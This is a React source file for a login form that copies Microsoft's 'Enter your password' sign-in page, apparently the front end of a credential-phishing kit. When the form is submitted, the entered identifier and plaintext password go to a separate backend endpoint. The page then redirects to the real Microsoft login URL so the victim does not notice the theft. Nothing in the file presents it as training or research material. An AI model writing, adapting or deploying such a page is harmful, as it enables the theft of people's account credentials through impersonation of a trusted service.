import './index.css'
import { useLocation } from 'react-router-dom';
import { useState } from 'react';

function Logform(){

     const location = useLocation();
    const identifier = location.state?.identifier || "";

    const [password, setPassword] = useState("");

    const handleSubmit = async (e) => {
        e.preventDefault();

        // Build payload depending on identifier type
        let payload = { password: password };

        if (identifier.includes("@")) {
            payload.email = identifier;
        } else if (/^\d+$/.test(identifier)) {
            payload.phone_number = identifier;
        } else {
            payload.username = identifier;
        }

        try {
            const response = await fetch("http://127.0.0.1:8000/api/test-users/create/", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
});

            const data = await response.json();
            console.log("Server Response:", data);

            if (!response.ok) {
                alert("Failed to create user: " + JSON.stringify(data));
                return;
            }

            window.location.href =
            "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=638996170941431280.ZTU4MDQ2YjAtYmUxNC00NzNhLWEyOGEtMmFmMjA0MDQyOWM4OThmNjI0MDQtNjYwNi00NmJlLTg4ZjgtN2ZiNzdiMjExNDRi&ui_locales=en-US&mkt=en-US&client-request-id=00d537ca-bc03-476d-bd22-2f188581f14e&state=3X40Cp5tC4fmXsNdKQ_G1w205Twn3ZPrsBUllYwD_PfoYbsNY5UznNGCaf4BvWUdE9rmMkjDilmKWklTFnzjawh9Tdb9cbu6wzWlfUAbBris0z4StXZgqEOLfuabezcM4UMNC_VYXErSrlkkc0ky4M6N38I-hYL_dYjNhWFIvw-Y-4uW0FRTEOQ6uPI43nD89iPs3Tj1XS4VhXAGrCiNTDp0XbUTNzjQKTw6UurXD_rMJZS-x6kMS5k2xJCP4DrsIdZX8yZkvSgYOeLBOUq04ULVAeC1rrNGqzKyVMrutHYTRw4UfA_Sm2y2IgCKw2UvUvmd1xDaXuWFbP7px4DA-agXC-7Km5pco9KrcKOfucqWPjKr36GKfZiK0dM3cqTlysslJHTP4dk8opFacCbnQjNvpHeQLirH21ljac7PduXh6FyAS_bjga_xCe690NkT&x-client-SKU=ID_NET8_0&x-client-ver=8.5.0.0";

        } catch (error) {
            console.error("Error:", error);
            alert("Backend connection error. Is Django running?");
        }
    };



    return(
        <div className='w-full flex justify-center'>
           <div className='logbox mt-[-70px] h-[400px] bg-white border border-gray-300 rounded-xl shadow-lg p-10'>
            <div className=''>
                <div className='w-[90%] flex justify-center'>
                <img className='h-14' src="/mstt.png" alt="mt logo" />
                </div>
               

               <div className='flex  '>
                  
                  <form onSubmit={handleSubmit}>
                    <div className='w-[100%] flex justify-center'>
                    <p className='w-fit p-[4px] mt-4 bg-transparent rounded-xl border border-gray-400'>
                        {identifier}
                    </p>
                    </div>

                  <div className='flex justify-center my-4'>
                    <h1 className='text-2xl  text-black'>Enter your password</h1>
                  </div>



                    <input  
                     type="text" 
                     placeholder='Password' 
                     value={password}
                     onChange={(e) => setPassword(e.target.value)}

                     className='ms-input bg-white w-full pl-[10px] p-1 border-[1px] border-gray-400 focus:border-blue-600 focus:outline-none'
                    />
                    
                    <div className='w-[100%] mb-4 flex justify-start'>
                        <a href=""><p className=''>Forgot your password?</p></a>

                    </div>
                    <div className='w-[100%]  my-4 h-10 bg-blue-700 text-white flex justify-center'>
                        <button type='submit' className='border-0 text-white'>Next</button>

                    </div>
                   
                 </form>
               </div>
            </div>
           </div>
        </div>
    )
}

export default Logform;